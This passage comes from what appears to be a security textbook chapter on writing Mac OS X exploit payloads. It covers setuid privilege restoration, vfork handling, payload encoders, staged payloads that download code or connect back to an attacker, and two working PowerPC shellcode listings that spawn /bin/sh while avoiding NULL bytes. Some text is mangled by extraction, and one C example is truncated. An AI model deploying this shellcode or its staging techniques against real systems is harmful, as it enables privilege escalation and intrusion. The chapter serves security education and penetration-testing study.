On UNIX, it is important to remember that a process has a real user ID and an
effective user ID. The effective user ID governs what access the process has and
the real user ID determines who the user really is. For example, after running a
set-user-ID root executable, the real user ID remains the same, but the effective
user ID is set to 0 (root), giving the process superuser privileges. To complicate
this further, there is also the saved set-user-ID, which is set when the effective
user ID is set to a different value. This allows processes to relinquish higher
privileges temporarily and regain them when necessary.
In Mac OS X Leopard, the system shell (/bin/sh, which is actually /bin/bash)
will drop privileges if the effective user ID does not match the real user ID and
the effective user ID is less than 100. This means that in many cases running a
shellcode payload inside a set-user-ID root process will not actually give you a
root shell. You can, however, restore them in many cases by calling seteuid(0)
and then setuid(0) to set your effective and real user IDs to root.
Forking a New Process
On Mac OS X a multithreaded task cannot execute a new process unless it has
previously called vfork(); otherwise, execve() will return the error ENOTSUP.
Typically this is an issue only for remote and client-side exploits, because
those targets are more commonly multithreaded than local binaries. There is a
9955336633cc0099..iinndddd 221155 11//2255//0099 44::4422::2288 PPMM
216 Part III ■ Exploitation
complication with using vfork(), however, in local exploits. If you vfork() before
calling a shell unnecessarily, your shell will be executed in the background and
you won’t be able to interact with it. Since execve() checks whether the process
is a vfork() child before it checks the rest of the arguments, you can fi rst run
execve() with bogus arguments to determine whether you should vfork().
The vfork() system call is like fork(), except that the parent process is sus-
pended until the child process executes the execve() system call or exits. This
fact facilitates the code for this component since you should know that if you
call execve() in the parent, it will just fail again and continue to execute the
code that follows.
#include 
#include 
int main(int argc, char* argv[])
{
if (execve(NULL, NULL, NULL) 
int main(int argc, char* argv[])
{
char* path = “/bin/sh”;
execve(path, NULL, NULL);
}
Similarly, we also pass in NULL for the environment pointer to give the pro-
cess an empty environment. Compile and run this program just to make sure
that it works as expected.
% gcc -o execve_binsh execve_binsh.c
% ./execve_binsh
bash-3.2$ exit
exit
%
9955336633cc0099..iinndddd 221166 11//2255//0099 44::4422::2288 PPMM
Chapter 9 ■ Exploit Payloads 217
Encoders and Decoders
Be careful to avoid NULL bytes in instruction encodings for the payloads that
are intended for use in local exploits. As many exploits take advantage of over-
fl ows in ASCII strings, a NULL byte in the payload would signal an early ter-
mination of the attack string. To avoid NULLs, use some simple tricks, such as
subtracting a constant and right-shifting to extract the fi nal value. For payloads
that are used in remote exploits, their size and complexity quickly makes using
a payload decoder stub more economical in terms of payload size and develop-
ment time.
A payload decoder stub is a small payload component that decodes the rest of
the payload from an alternate encoding into a form that may be executed. The
corresponding payload encoder, written in a high-level language, fi nds a suit-
able encoding for the payload that avoids undesirable byte values and prepares
the encoded payload in the form that the decoder stub expects. Depending on
where the vulnerability is, there may be a number of byte values that need to be
avoided. For example, if the vulnerability is in a web server’s request parser, all
whitespace characters may need to be avoided. Rather than rewrite the exploit
payloads based on the byte values that are signifi cant in the application that
you are exploiting, it is easier to employ reusable payload decoder stubs and
encoders that transform the raw payloads to avoid these characters.
Staged Payload Execution
Many exploit injection vectors may have constraints on the size of payload that
may be used with them. For example, the payload may need to fi t inside a net-
work protocol request or fi le format with size constraints. You do not, however,
need to let these size constraints restrict the functionality of your payloads. To
get around any potential size constraints of an exploit injection vector, many
payloads are built in stages, as described by LSD and used in penetration-testing
frameworks such as the Metasploit Framework, Immunity’s CANVAS, and Core
Security’s CORE IMPACT.
The main idea behind a staged payload system is that each stage prepares the
execution environment for the next stage, allowing the next stage to execute with
fewer constraints. For example, the fi rst stage in the exploit will typically be the
most size- and byte-value-constrained, as it will typically be embedded within
an arbitrary protocol or fi le format. The fi rst stage may search for a subsequent
stage elsewhere in memory or download it over the network.
9955336633cc0099..iinndddd 221177 11//2255//0099 44::4422::2288 PPMM
218 Part III ■ Exploitation
For example, a staged payload system may do some or all of the following.
■ Search for a 32-bit tag in memory and execute the memory immediately
following it if it is found
■ D ecode the next stage in memory by XORing itself with a constant byte
or 32-bit “key”
■ Establish a TCP/UDP connection with the attacker and repeatedly read
machine-code fragments into memory and execute them
■ R epair any memory structures damaged by the exploit-injection vector
(i.e., repair the heap, stack, exception handlers, etc.)
■ D ownload a shared library over a network connection or decode it from
elsewhere in memory and inject it into the running process
■ Download an executable over HTTP and execute it in a new process
Payload Components
We have developed a set of exploit payload components for Mac OS X that dem-
onstrate many of the common techniques used by penetration-testing frame-
works such as Metasploit, CANVAS, and IMPACT. The full source code, build
system, and Metasploit modules for all of these components can be downloaded
from this book’s website. In the rest of this chapter we will describe the fol-
lowing components in the process of explaining how to write custom exploit
payloads for both architectures.
execve_binsh—Call execve(NULL, “/bin/sh”, NULL) to execute a shell.
system—Execute a shell command just like the system() function does.
setuid_zero—Call seteuid(0) and setuid(0) to restore root privileges.
vfork—Determine whether vfork() is necessary; if so, call it.
decode_longxor—Decode the rest of the payload by XORing with a 32-bit
long value.
tcp_connect—Establish a TCP connection to a remote host.
tcp_listen—Listen on a TCP socket.
dup2_std_fds—Duplicate a socket fi le descriptor to standard input, stan-
dard output, and standard error fi le descriptors.
remote_execution_loop—Repeatedly read the buffer size from the socket,
read that many bytes into a buffer, evaluate it as machine code, and write
the return value to the socket.
inject_bundle—Read a compiled bundle from a socket, link and load it
into the current process, and call an exported function within it.
9955336633cc0099..iinndddd 221188 11//2255//0099 44::4422::2288 PPMM
Chapter 9 ■ Exploit Payloads 219
PowerPC Exploit Payloads
The PowerPC uses a RISC-based instruction set and generally follows a load-
store architecture. This means most assembly instructions operate purely on
registers as source and destination operands. Registers must be explicitly loaded
from or stored to memory using designated load and store instructions.
The PowerPC architecture uses 32 general-purpose registers, referred to as r0
through r31. The register r1 is used as the stack pointer by convention, r3 through
r10 are used for passing arguments to functions and system calls, and registers
r13 through r31 are free for arbitrary use and will be preserved across function
and system calls. The Application Binary Interface (ABI) reserves the remain-
ing registers for special use. There also are a few important special-purpose
registers: lr and ctr. The link register (lr) is used to store the return address in a
subroutine. When a function is called using the blr (branch and link register),
the memory address of the next instruction is stored in the link register. The
other special register, ctr, is typically used as a loop counter. There are special
branching instructions to decrement this register and branch if the register is not
equal to zero. It is also commonly used for register-indirect function calls.
Table 9-1 is a simple “cheat sheet” for some common PowerPC assembly
instructions. In the table’s Format column, rD refers to a destination register,
rS is a source register, and rA refers to an arbitrary register. SIMM refers to a
signed immediate constant value and UIMM represents an unsigned immediate
value. Memory references are referred to by d(rA), where d is a displacement
from the memory address stored in register rA.
Table 9-1: PowerPC Instruction Cheat Sheet
INSTRUCTION FORMAT DESCRIPTION
li lirD, SIMM Loads immediate value into register rD
lis lis rD, SIMM Loads immediate and shift left 16 bits
ori ori rD, rA, SIMM Logical OR register rA with immediate
into rD
mr mr rD, rS Moves register value from rS to rD
mfl r mfl r rD Moves from link register into register rD
mtctr mtctr rS Moves from register rS into ctr register
mfctr mfctr rD Moves from ctr register into register rD
addi addi rD, rA, SIMM Adds immediate and rA, stores in rD
subi subi rD, rA, SIMM Subtracts signed immediate from rA into rD
srawi srawi rA, rS, SH Shifts rS right arithmetic SH bits into rA
Continued
9955336633cc0099..iinndddd 221199 11//2255//0099 44::4422::2288 PPMM
220 Part III ■ Exploitation
Table 9-1 (continued)
INSTRUCTION FORMAT DESCRIPTION
xor xor rA, rS, rB Exclusive-ORs rS and rB into rA
sth sth rS, d(rA) Stores halfword in rS to effective address
stw stw rS, d(rA) Stores word in rS to effective address
stmw stmw rS, d(rA) Stores multiple words from rS to r31
cmplw cmplw rA, rB Compares logical register to register
cmpli cmpli rA, UIMM Compares logical register to immediate
bnel bnel target_addr Branches if not equal and links
bdnzt bdnzt target_addr Decrements ctr, branches if not zero
and true
bdnzf bdnzf target_addr Decrements ctr, branches if not zero and
false
sc sc Executes system call
tweq tweq rA, rB Traps if equal; “tweq r4, r4” is a breakpoint
System calls on PowerPC are issued by executing the sc (system call) instruc-
tion. The system call number is placed in r0 and arguments to the system call
are placed in registers r3 through r10. The system call’s return value is placed
in r3 upon returning. If the system call was successful, the instruction imme-
diately following the sc instruction is skipped. If the system call resulted in an
error, that instruction is executed. Typically this system call error instruction
slot is used to branch to error-handling code. While developing payloads, it is
often best to use this slot to execute a breakpoint trap (tweq r4, r4) to facilitate
debugging. In fi nal payloads, this slot can be used to branch to an error handler
or code to exit cleanly.
As our fi rst example, we’ll demonstrate executing a single system call. The
assembly code program that follows does just that. We write payloads using
the GNU assembler included with Mac OS X by declaring global symbols with
the .globl command and use the label _main for our entry point. This allows
us to compile and link our assembly components by themselves or with other
code written in C.
.globl _main
_main:
li r3, 13 ; exit status code
li r0, 1 ; SYS_exit = 1
sc
tweq r4, r4 ; breakpoint if system call fails
9955336633cc0099..iinndddd 222200 11//2255//0099 44::4422::2288 PPMM
Chapter 9 ■ Exploit Payloads 221
Now assemble it and run it to make sure it works. Use the compiler to assemble
the code, since it will also link it to create a standalone executable that you can
run to test the payloads.
% cc -o exit exit.s
% ./exit
% echo $?
13
You can see that the executable returned 13, which is the value that was
passed to the exit() system call in the assembly code. Also, the breakpoint
instruction following the sc instruction was not executed, indicating that the
system call was successful. Now we’ll move onto doing something more useful,
like executing a shell.
execve_binsh
Look back at the C version of execve_binsh, listed in earlier in the section
“Executing a Shell.” While the compiled version of the code loads the string “/
bin/sh” from the executable’s data segment, you cannot do that in an exploit
payload. We will present two ways to get around this. The fi rst shellcode uses
a trick to retrieve the address in memory where it is executing from and locates
the string “/bin/sh” relative to that. The following code shows execve_binsh.s,
a payload that does just that.
There are a few important tricks to notice in this shellcode. The fi rst two
instructions are a xor./bnel combo. The instruction mnemonic with the dot
at the end instructs the processor to update the condition register. The bnel
instruction that follows means to “branch and link if not equal/zero” and will
not branch because the preceding instruction had a result equal to zero. The
trick here is that even though the branch was not taken, the return address of
the instruction following the bnel instruction is stored in the link register. The
next address stores the value of the link register into r31. Use this trick to obtain
the address in memory of the payload, and, subsequently, to add the offset from
the current instruction to the beginning of the command string to calculate the
address of the command string in memory. The other tricks involve adding
magic-constant offsets or shifting magic constants to result in the values needed
and avoid instruction encodings with NULL bytes in the process. You will see
that this is commented in the shellcode.
;;; $Id: execve_binsh.s,v 1.5 2001/07/26 15:25:06 ghandi Exp $
;;; PPC Mac OS X (maybe others) shellcode
;;;
;;; Dino Dai Zovi , 20010726
;;;
9955336633cc0099..iinndddd 222211 11//2255//0099 44::4422::2288 PPMM
222 Part III ■ Exploitation
.globl _execve_binsh
.text
_execve_binsh:
;; Don’t branch, but do link. This gives us the location of
;; our code. Move the address into GPR 31.
xor. r5, r5, r5 ; r5 = NULL
bnel _execve_binsh
mflr r31
;; Use the magic offset constant 268 because it makes the
;; instruction encodings null-byte free.
addi r31, r31, 268+36
addi r3, r31, -268 ; r3 = path
;; Create argv[] = {path, 0} in the “red zone” on the stack
stw r3, -8(r1) ; argv[0] = path
stw r5, -4(r1) ; argv[1] = NULL
subi r4, r1, 8 ; r4 = {path, 0}
;; 59 = 30209 >> 9 (trick to avoid null-bytes)
li r30, 30209
srawi r0, r30, 9 ; r0 = 59
.long 0x44ffff02 ; execve(path, argv, NULL)
path: .asciz “/bin/sh”
The following second shellcode example uses an alternate method. Instead
of locating itself in memory, it will create that string manually on the stack and
pass a pointer to it to the execve() system call. The code for execve_binsh2.s is
as follows.
.globl _main
_main:
xor r31, r31, r31 ; “\0\0\0\0”
lis r30, 0x2f2f ; “//”
addi r30, r30, 0x7368 ; “sh”
lis r29, 0x2f62 ; “/b”
addi r29, r29, 0x696e ; “in”
stmw r29, -12(r1) ; Write “/bin/sh” to stack
subi r3, r1, 12 ; path = “/bin//sh”
mr r4, r31 ; argv = NULL
mr r5, r31 ; envp = NULL
li r30, 30209 ; avoid NULL in encoding
srawi r0, r30, 9 ; (30209 >> 9) == 59 == SYS_execve
.long 0x44ffff02 ; execve(“/bin//sh”, NULL, NULL)
tweq r4, r4 ; breakpoint trap
9955336633cc0099..iinndddd 222222 11//2255//0099 44::4422::2288 PPMM
Chapter 9 ■ Exploit Payloads 223
The trick used here to write “/bin/sh” compactly to the stack requires some
explanation. The PowerPC stmw (store multiple words) instruction writes con-
secutive registers, starting at the given source register, to memory at the given
address. We used it in the preceding code to write the r29, r30, and r31 registers
to the stack. Before doing so, we had to load those registers with values such
that “/bin/sh” is written correctly to the stack. We did this by setting r29 to the
value corresponding to the ASCII string “/bin”, r30 to “//sh”, and clearing r31’s
value so that it served as the string’s NULL terminator.
We also had to use some tricks to avoid NULL bytes in the instruction encod-
ings for the payload. There will typically be problems with small constant oper-
ands. For example, using the constant 59 (the system-call number for execve) in
the li instruction resulted in a NULL byte in the encoding. We compensate for